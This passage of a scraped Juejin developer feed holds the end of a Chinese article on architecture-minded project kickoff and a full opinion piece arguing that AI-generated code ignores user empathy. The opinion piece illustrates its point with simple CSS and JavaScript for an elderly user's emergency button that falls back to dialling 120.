to3feVVcVB9qehIL8EJy8nChwgr0O2xxBnhGU5eP2CfYbl/m4gBRsbtneMORP9oGpjpcCsiKzHHfdOPiQ/wMniyFEu2dbiTQCAeN/vavC466BGYLttXc9fmXBXMGlAhiHHur+sq6uPiUI9z7CVHMPwBnLSuuN8FuC48/Oaz1ylt94XfrW5ouyprwWfYRkwNyCyYYjwkBHows1fa+tV/fzGxlv39b9gqvfPmQ+i/HK8KlcBjhHwfl8HEHyOd1JnuzZd66S3TTPNNNP8/wDAfwDG7G0m9LKBpwAAAABJRU5ErkJggg==) 10px 10px no-repeat;background-size:40px;background-color:#fdfdfd}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#fdfdfd}.markdown-body a{text-decoration:none;font-weight:700;color:#ef7060;border-bottom:1px solid #ef7060}.markdown-body a:active,.markdown-body a:hover{color:#ef2d26}.markdown-body table tr td,.markdown-body table tr th{border:1px solid #ccc;padding:5px 10px}.markdown-body table{display:block!important;width:auto;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{background:#f0f0f0;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#f8f8f8}.markdown-body blockquote{margin-inline-start:0;margin-inline-end:0;border-left:3px solid #ef7060;background:#fff9f9;padding:1px 20px;margin-top:20px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-light">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#383a42;background:#fafafa}.hljs-comment,.hljs-quote{color:#a0a1a7;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#a626a4}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e45649}.hljs-literal{color:#0184bb}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#50a14f}.hljs-built_in,.hljs-class .hljs-title{color:#c18401}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#986801}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#4078f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><h2 data-id="heading-0">🚀 一、项目启动三阶段：从思到形</h2>
<p>项目启动可以拆成三个阶段，每个阶段对应上文的思维要点和执行准则。</p>
<h3 data-id="heading-1"><strong>阶段 1：思考与设计（脑力阶段）</strong></h3>
<blockquote>
<p>“行万里路，不如脑子想清楚。”</p>
</blockquote>
<p><strong>目标：确定性要大于行动速度。</strong></p>
<p><strong>关键输出：</strong></p>
<ul>
<li>✅ 业务目标清单（核心可交付是什么？）</li>
<li>✅ 技术选型 &amp; 模块划分（基于模板启动）</li>
<li>✅ 组件粒度 &amp; 数据流方向（决定架构风格）</li>
<li>✅ 风险点与预案（接口不确定、UI延迟设计等）</li>
</ul>
<p><strong>方法落地：</strong></p>
<ul>
<li>使用 <code>oa-start-template</code> 或 <code>machine-start-template</code> 创建基础目录结构。</li>
<li>先写出基础 <code>store</code> 结构与 <code>route</code> 命名方案。</li>
<li>output 一个简洁的架构草图或 README，让团队“心里有图”。</li>
</ul>
<hr/>
<h3 data-id="heading-2"><strong>阶段 2：构建与闭环（执行阶段）</strong></h3>
<blockquote>
<p>“快速出成果，但思考不放松。”</p>
</blockquote>
<p><strong>对应前文开发阶段</strong> a → i：</p>























































<table><thead><tr><th align="left">阶段</th><th align="left">实际应用</th><th align="left">关键产出</th></tr></thead><tbody><tr><td align="left">a</td><td align="left">梳理确定需求</td><td align="left">项目 README, todo, milestone</td></tr><tr><td align="left">b</td><td align="left">构建静态页面</td><td align="left">skeleton 页面或 Figma 转换样本</td></tr><tr><td align="left">c</td><td align="left">设计基础数据结构</td><td align="left">定义 <code>store</code> 和 <code>types.ts</code></td></tr><tr><td align="left">d</td><td align="left">扩展业务结构</td><td align="left">组织业务层数据流/adapter</td></tr><tr><td align="left">e</td><td align="left">构建 mock 服务</td><td align="left"><code>mock-server</code> / <code>msw</code> / <code>api sandbox</code></td></tr><tr><td align="left">f</td><td align="left">优化视图</td><td align="left">规范 UI 风格（主题色、按钮设计）</td></tr><tr><td align="left">g</td><td align="left">优化交互</td><td align="left">添加骨架屏、loading、状态提示</td></tr><tr><td align="left">h</td><td align="left">接入真实 API</td><td align="left">严格字段匹配，确保无隐患</td></tr><tr><td align="left">i</td><td align="left">自测收尾</td><td align="left">组件单测、E2E 或手动冒烟测试</td></tr></tbody></table>
<p><strong>落地技巧：</strong></p>
<ul>
<li>在前 3 天内形成一个可“演示”的雏形（mock 驱动展示）。</li>
<li>每次 merge 前保持自测闭环。</li>
<li>使用 Git 分支命名规范（<code>feature/xxx</code>、<code>fix/xxx</code>）。</li>
</ul>
<hr/>
<h3 data-id="heading-3"><strong>阶段 3：沉淀与复盘（强化阶段）</strong></h3>
<blockquote>
<p>“把握意味着能总结复用。”</p>
</blockquote>
<p><strong>要做的：</strong></p>
<ol>
<li>✍️ 整理出可复用模块（store、hooks、组件）。</li>
<li>🧩 提炼命名体系（统一命名风格与文件命名格式）。</li>
<li>📚 把项目经验补到团队 wiki 或模板中。</li>
<li>✨ 依据设计主题整理统一样式变量（主题色 / spacing / typography）。</li>
<li>⏱ 安排一次复盘会议——讨论“哪些思考提前做会更好”。</li>
</ol>
<p><strong>目标：</strong></p>
<ul>
<li>下一次项目启动，可以直接从模板启动；</li>
<li>启动文档具备复用性和方向感；</li>
<li>团队在执行中提升“思考的肌肉”。</li>
</ul>
<hr/>
<h2 data-id="heading-4">🧠 二、角色代入法：谁应该在什么时刻思考什么？</h2>

























<table><thead><tr><th align="left">角色</th><th align="left">聚焦点</th><th align="left">关键问题</th></tr></thead><tbody><tr><td align="left">💡 架构师</td><td align="left">结构、流转、命名、复用</td><td align="left">“这个结构3个月后还能用吗？”</td></tr><tr><td align="left">⚙️ 开发者</td><td align="left">实现路径与闭环</td><td align="left">“这功能最小化可行交付是什么？”</td></tr><tr><td align="left">🧭 产品/负责人</td><td align="left">节奏与清晰度</td><td align="left">“项目现在的确定性够吗？”</td></tr></tbody></table>
<p>🪞<strong>代入角色</strong>意味着——在执行前问一句：</p>
<blockquote>
<p>“如果我是产品 / 使用者 / 接口方，我希望什么样的结果？”</p>
</blockquote>
<p>这种内化的思维切换，就是“思考习惯”的落地方式。</p>
<hr/>
<h2 data-id="heading-5">🧩 三、架构主题与视觉的一致性打法</h2>
<blockquote>
<p>软件架构不是只在代码里体现，也体现在用户体验中。</p>
</blockquote>
<p><strong>实践建议：</strong></p>
<ol>
<li>提前定义主题 token（颜色、间距、圆角、阴影）。</li>
<li>根据团队品牌色（例如蓝、黑、灰系列）在 <code>tailwind.config.js</code> 或样式系统中建主题。</li>
<li>对标大厂组件风格（Google Material、GitHub Primer）。</li>
<li>制作 1 页 “UI标准卡”——即芯片、按钮、表单、输入框等样式对照。</li>
</ol>
<p>这样从启动开始，视觉和架构就有“一致节奏感”。</p>
<hr/>
<h2 data-id="heading-6">🔁 四、以结果为导向的任务节奏</h2>
<blockquote>
<p>“如果结果不推动业务，就延后。”</p>
</blockquote>
<ul>
<li>每次迭代定义“能演示的成果”（mock 也行）</li>
<li>所有功能须验收：可复现、可扩展、可理解</li>
<li>延迟不如简化，<strong>不要先做带不动的功能</strong></li>
</ul>
<p>通过这种节奏，团队的执行力会自动与“架构思维”对齐。</p>
<hr/>
<h2 data-id="heading-7">✨ 五、最终产物：一个项目启动模板应包含</h2>





































<table><thead><tr><th align="left">模块</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>/src/stores</code></td><td align="left">核心 store + 业务结构化数据流</td></tr><tr><td align="left"><code>/src/routes</code></td><td align="left">路由命名规则一致，文件结构即系统结构</td></tr><tr><td align="left"><code>/src/components</code></td><td align="left">复用基础组件库（按模板标准命名）</td></tr><tr><td align="left"><code>/src/mocks</code></td><td align="left">mock 服务模拟真实交互</td></tr><tr><td align="left"><code>/theme.config</code></td><td align="left">系统主题与品牌样式定义</td></tr><tr><td align="left"><code>/docs</code></td><td align="left">项目架构文档 + 执行准则</td></tr><tr><td align="left"><code>/README.md</code></td><td align="left">项目启动简述与执行清单</td></tr></tbody></table>
<p>这就是一个真正“用架构思维启动项目”的标准蓝本。</p>
<hr/>
<h2 data-id="heading-8">🧭 结语</h2>
<p>将“脑力”和“流水线”结合，就是让项目更有节奏感地前进。<br/>
架构的思维不是让流程更复杂，而是<strong>让每个人少走弯路</strong>。</p>
<blockquote>
<p>想清楚再行动，结构化代替堆砌，<br/>
模板化提升速度，复盘式积累成长。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2026 年AI 能生成代码，但都是一坨屎😒]]></title>    <link>https://juejin.cn/post/7602252722372493363</link>    <guid>https://juejin.cn/post/7602252722372493363</guid>    <pubDate>2026-02-03T03:10:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602252722372493363" data-draft-id="7602259669707030554" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2026 年AI 能生成代码，但都是一坨屎😒"/> <meta itemprop="keywords" content="前端,JavaScript,AI编程"/> <meta itemprop="datePublished" content="2026-02-03T03:10:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ErpanOmer"/> <meta itemprop="url" content="https://juejin.cn/user/3878732754331096"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2026 年AI 能生成代码，但都是一坨屎😒
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3878732754331096/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ErpanOmer
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T03:10:42.000Z" title="Tue Feb 03 2026 03:10:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/352e77bef90e47cba1bade943fa8e8a7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770693042&amp;x-signature=O2YmoLIxAOK25G%2FCVfD6nSDI%2FrE%3D" alt="featuredImage.webp" loading="lazy"/></p>
<p>现在的 IDE 已经进化到了不可思议的地步。昨天，产品经理在群里火急火燎地提了一个需求：给我们的 web 老年版 App ，要大按钮，要醒目，要快。</p>
<p>我把这句话喂给了最新的 Google Antigravity。</p>
<p><strong>3 秒</strong>。真的只有 3.5 秒 😲。</p>
<p>它直接吐出了 300 行完美无瑕的 React 代码。Tailwind 样式美观，TypeScript 类型定义严丝合缝，甚至还贴心地自动补全了单元测试。</p>
<p>代码跑起来了，测试全绿，没有任何报错。</p>
<p>如果是三年前，我可能会惊叹自己要失业了。但现在，我看着屏幕上那个密密麻麻的按钮，内心毫无波澜，甚至想骂人。🤬🤬🤬</p>
<p><strong>这写的是一坨什么屎？？？？</strong></p>
<h3 data-id="heading-0">代码都是冷冰冰的</h3>
<p>AI 生成的代码，从计算机科学的角度看是满分的。但它根本不知道，使用这个产品的用户，是一位 75 岁、患有白内障、手抖得厉害的独居老人。</p>
<p>试想一下，当他在深夜突发心脏不适，颤抖着手打开手机时，他会遭遇什么？</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5317a481b7b04c358d7a42898554e359~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770693042&amp;x-signature=HCh5RpK0H7GCB0%2Ff8YUOXL3K%2FQc%3D" alt="2 (1).png" loading="lazy"/></p>
<p>在老人模糊且敏感的视野里，不是科技感，而是一团晃眼的光斑，甚至可能诱发眩晕。</p>
<p>那个严丝合缝的 <strong>点击逻辑</strong>，要求手指必须精准落在 40px 的圆心内。而老人在慌乱中，手指接触屏幕的面积往往是整个指腹，甚至是大鱼际。AI 写的代码会判定这是误触，然后无动于衷。</p>
<p>那个毫无报错的 <strong>API 调用</strong>，在老人那微弱的 2G 信号地下室里，会直接超时。AI 很负责任地弹出了一个标准的 Ant Design 风格提示框：<strong>Error: 504 Gateway Timeout😖</strong>。</p>
<p>这一刻，AI 完成了写代码的任务，但它彻底搞砸了救命这件事 🤦‍♂️。</p>
<p>我毫不犹豫地删掉了那 300 行所谓的完美代码。</p>
<p>我手写了 50 行最笨拙的 CSS。我去掉了所有特效，把按钮改成了高对比度的红黄配色，土是土了点，但能在黑暗里一眼看到。我把点击热区扩大到了半个屏幕，哪怕他用拳头砸都能触发。</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc39fc4d03824cc5896d1e18c4e41006~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770693042&amp;x-signature=77e0jZkY7xQy2r8pjPqDfyd3W2g%3D" alt="screenshot-20260203-110207.png" loading="lazy"/></p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* style.css */</span>

* {
  <span class="hljs-attribute">box-sizing</span>: border-box;
}

<span class="hljs-selector-tag">html</span>, <span class="hljs-selector-tag">body</span> {
  <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;
}

<span class="hljs-selector-tag">body</span> {
  <span class="hljs-attribute">background</span>: <span class="hljs-number">#000</span>; <span class="hljs-comment">/* 纯黑，减少眩光 */</span>
}

<span class="hljs-comment">/* 整个屏幕就是一个按钮 */</span>
<span class="hljs-selector-id">#emergency-btn</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">100vw</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">100vh</span>;

  <span class="hljs-attribute">background</span>: <span class="hljs-number">#ff0000</span>; <span class="hljs-comment">/* 纯红 */</span>
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#ffff00</span>;      <span class="hljs-comment">/* 纯黄 */</span>

  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">48px</span>;
  <span class="hljs-attribute">font-weight</span>: bold;
  <span class="hljs-attribute">line-height</span>: <span class="hljs-number">1.4</span>;

  <span class="hljs-attribute">border</span>: none;
  <span class="hljs-attribute">outline</span>: none;

  <span class="hljs-comment">/* 防止误操作带来的系统延迟 */</span>
  touch-action: manipulation;
}

<span class="hljs-comment">/* 防止手机系统点击闪烁 */</span>
<span class="hljs-selector-id">#emergency-btn</span><span class="hljs-selector-pseudo">:active</span> {
  <span class="hljs-attribute">background</span>: <span class="hljs-number">#cc0000</span>;
}

</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// main.js</span>

<span class="hljs-keyword">const</span> btn = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'emergency-btn'</span>);

btn.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// 尝试先走“智能路径”</span>
  <span class="hljs-title function_">trySendEmergencySignal</span>();
});

<span class="hljs-keyword">function</span> <span class="hljs-title function_">trySendEmergencySignal</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> controller = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbortController</span>();
  <span class="hljs-keyword">const</span> timeout = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
    controller.<span class="hljs-title function_">abort</span>();
  }, <span class="hljs-number">3000</span>); <span class="hljs-comment">// 3 秒，不能再多了</span>

  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://example.com/api/emergency'</span>, {
    <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
    <span class="hljs-attr">signal</span>: controller.<span class="hljs-property">signal</span>,
  })
    .<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-comment">// 成功也直接拨号，不等服务器“确认”</span>
      <span class="hljs-title function_">dial120</span>();
    })
    .<span class="hljs-title function_">catch</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-comment">// ⚠️ 任何错误，直接走最原始方案</span>
      <span class="hljs-title function_">dial120</span>();
    })
    .<span class="hljs-title function_">finally</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-built_in">clearTimeout</span>(timeout);
    });
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">dial120</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 不提示、不解释、不弹窗</span>
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = <span class="hljs-string">'tel:120'</span>;
}

</code></pre>
<p>我还在 catch 语句里加了一段逻辑：<strong>如果网络超时，不要弹窗报错，而是直接调用系统的电话拨号盘，填入 120。</strong></p>
<p>这段代码，没有任何设计模式，甚至有点丑。但它能在关键时刻，真的把求救信号发出去。</p>
<h3 data-id="heading-1">2026 年，我们缺的是代码吗？</h3>
<p>完全不缺。GitHub 上的代码量早就指数级爆炸了。现在的初级程序员，或者说是 Prompt 工程师，最擅长的事情就是：生成、复制、粘贴。</p>
<p>只要跑得通，只要 UI 看起来一样，就提交上线。</p>
<p>于是，我们的项目里充斥着这种<strong>屎代码</strong>。它们没有明显的 Bug，但它们极其臃肿、逻辑割裂、毫无上下文关联。它们就像超市里的预制菜，看着像那么回事，吃起来全是工业糖精味 😮‍💨。</p>
<p><strong>什么叫正确的事？</strong></p>
<p>正确不是 Type Check Passed。</p>
<p>正确是知道这里为什么不能用无限滚动，因为用户需要到底部找联系我们。正确是知道在表单提交失败时，不要只红框提示，而是要自动保留用户刚才敲了 500 字的评论，别让他重写。</p>
<p>AI 永远学不会心疼用户。它没有痛觉，没有焦虑，没有爱。它不会因为页面白屏了 3 秒而感到愧疚，但你会。</p>
<h3 data-id="heading-2">程序员的护城河，是同理心</h3>
<p>很多人问我，2026 年了，我还需要学写代码吗？</p>
<p>我的回答是：你不需要学怎么写代码，但你需要学<strong>为什么写代码</strong>。</p>
<p>以前，我们的价值是翻译——把人类的需求翻译成机器能懂的 JavaScript。现在，AI 把翻译的活儿干了。我们的价值变成了共情——去感受屏幕背后那个真实人类的喜怒哀乐。</p>
<p>当 AI 能够一键生成整个商城系统时，你能做的，是去思考：</p>
<p>在这个支付环节，用户会不会因为犹豫而流失？这个报错提示，会不会让用户觉得自己很蠢？如果是色弱用户，能不能看清这个图表？（比如我😭）</p>
<p>这些细微的、关乎人性的决策，才是 1 和 0 之间那道无法跨越的鸿沟。</p>
<hr/>
<p>在这个代码泛滥的年代，<strong>克制</strong>反而成了一种美德。</p>
<p>别因为 AI 能生成，你就疯狂堆砌功能。别因为 AI 能优化，你就忽略了真实的体感。</p>
<p>请停下来想一想：这行代码背后，是一个活生生的人。他可能是焦急的父亲，可能是疲惫的打工人，也可能是你年迈的父母。</p>
<p>AI 可以帮你建起万丈高楼，但只有你能决定，要不要在楼道里，为晚归的人留一盏温暖的灯 ❤️。</p>
<p>这才是我们程序员在 2026 年，依然无可替代的理由。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/53b616c43247473790464f7af333311e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770693042&amp;x-signature=TiQooLRhWNqixwaWP%2FX%2Bnu9awPg%3D" alt="谢谢大家.gif" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[颜色与渐变：hex、rgb、hsl、渐变、混合模式]]></title>    <link>https://juejin.cn/post/7602162809291800614</link>    <guid>https://juejin.cn/post/7602162809291800614</guid>    <pubDate>2026-02-03T01:34:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602162809291800614" data-draft-id="7602177113685246003" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="颜色与渐变：hex、rgb、hsl、渐变、混合模式"/> <meta itemprop="keywords" content="前端,CSS"/> <meta itemprop="datePublished" content="2026-02-03T01:34:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="VixenAhri"/> <meta itemprop="url" content="https://juejin.cn/user/741541894953144"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            颜色与渐变：hex、rgb、hsl、渐变、混合模式
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/741541894953144/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    VixenAhri
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T01:34:08.000Z" title="Tue Feb 03 2026 01:34:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
